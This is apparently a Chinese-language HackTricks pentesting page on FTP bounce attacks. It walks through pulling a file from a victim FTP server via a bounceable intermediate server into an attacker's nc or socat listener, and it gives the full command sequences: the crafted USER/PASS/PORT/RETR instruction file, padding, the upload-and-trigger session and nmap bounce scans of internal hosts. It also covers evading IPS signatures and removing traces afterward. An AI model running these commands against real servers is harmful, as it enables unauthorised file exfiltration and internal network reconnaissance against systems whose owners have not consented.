# FTP Bounce 下载 FTP 文件（方法 2）

{{#include ../../banners/hacktricks-training.md}}


## 概述

如果你能访问一个 **bounce FTP server**，你可以让它从 **另一个 FTP 服务器**（你知道一些凭证）请求文件并将该文件下载到 **你自己的服务器**。

## 要求

- 在 **FTP 中间服务器** 上有有效的 FTP 凭证
- 在 **受害者 FTP 服务器** 上有有效的 FTP 凭证
- 两台服务器都**接受 `PORT` 命令**（bounce FTP 攻击）
- 你可以在 **FTP 中间服务器** 的某个目录中**写入**
- 中间服务器在受害者 FTP 服务器中拥有比你更多的**访问权限**

## 步骤

1. 连接到 **你自己的 FTP 服务器** 并将连接设置为被动（`pasv` 命令），这样它会在某个目录中**监听**，受害服务会把文件发送到那里。
2. 构造一个将由 FTP 中间服务器发送给受害者服务器的文件（即 **exploit script**）。该文件应为纯文本，包含用于对受害者服务器进行认证、更改目录并将文件下载到你自己的服务器所需的命令。
3. 连接到 **FTP 中间服务器** 并上传前述文件。
4. 让 **FTP 中间服务器** 与 **受害者服务器** 建立连接并发送 exploit 文件。
5. 在你自己的 FTP 服务器上**捕获**该文件。
6. 从 FTP 中间服务器**删除**该 exploit 文件。

## 快速检查易受攻击的 bounce 主机

- **Nmap** 仍然支持 FTP bounce 检查。示例用于验证潜在的中间服务器：
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
如果服务器拒绝第三方 `PORT` 值，扫描将失败；但一些 **嵌入式/遗留打印机、NAS 和专用设备上的 FTP 守护进程** 仍然允许它。

## 自动化第二次 FTP 下载

下面是通过脆弱的中间 FTP 服务器拉取文件的现代化方法。

1. **在你的攻击机上打开一个被动监听器**（任何 TCP 接收端都可）：
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **注意** 将你的 IP 表示为 `A,B,C,D`，端口 `P` 表示为 `p1,p2`（`p1 = P/256`，`p2 = P%256`）。

3. **构建指令文件**，中间服务器会将其回放给受害者：
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **从中间服务器上传并触发**（经典代理 FTP）：
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **从你的监听器获取文件**（`loot.bin`）。
6. **清理** 中间服务器上上传的 `instrs` 文件。

注意：
- 填充（`dd ...`）可以防止在 RETR 完成之前控制连接关闭（经典文章中讨论过的大 TCP 窗口问题）。
- 任何可以 **监听并转储 TCP** 的服务都可以替代 FTP PASV 套接字（例如 `socat -u TCP-LISTEN:2121,fork - > loot.bin`）。
- 如果中间服务器限制特权端口，请在 `PORT` 中使用高端口并相应调整你的监听器。

## 额外技巧

- 在文件中继被阻止时，使用 bounceable FTP 服务器对内部主机进行 **port-scan**：
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- 一些现代 WAF/IDS（例如 Juniper IPS）会专门针对 **FTP:EXPLOIT:BOUNCE-ATTACK** 提供签名；嘈杂的 payload 或缺少填充可能会触发它们。
- 当中间服务器强制执行“PORT 到同一主机”限制时，将你的 **监听器放在中间服务器本身**（如果你具有写/执行权限），并稍后转发捕获的文件。

想要更详细的老派操作流程，请查看： [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## 参考资料

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
